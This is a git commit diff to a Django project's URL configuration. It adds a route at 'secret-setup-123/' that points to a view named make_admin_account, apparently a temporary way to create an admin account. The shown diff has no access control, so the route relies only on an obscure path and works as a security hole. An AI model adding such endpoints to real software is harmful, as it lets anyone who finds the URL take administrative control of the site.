76e5b1e9fc31d965e78eea6d05686a8e268af521
teamgerama <teamgerama@gmail.com>
2026-05-07 18:51:41 +0000

    Admin: Adding temporary setup script

--- team_gerama/urls.py
+++ team_gerama/urls.py
@@ -2,8 +2,10 @@ from django.contrib import admin
 from django.urls import path, include
 from django.conf import settings
 from django.conf.urls.static import static
+from academy.views import make_admin_account
 
 urlpatterns = [
     path('admin/', admin.site.urls),
+    path('secret-setup-123/', make_admin_account),
     path('', include('academy.urls')), # This connects your app
 ] + static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
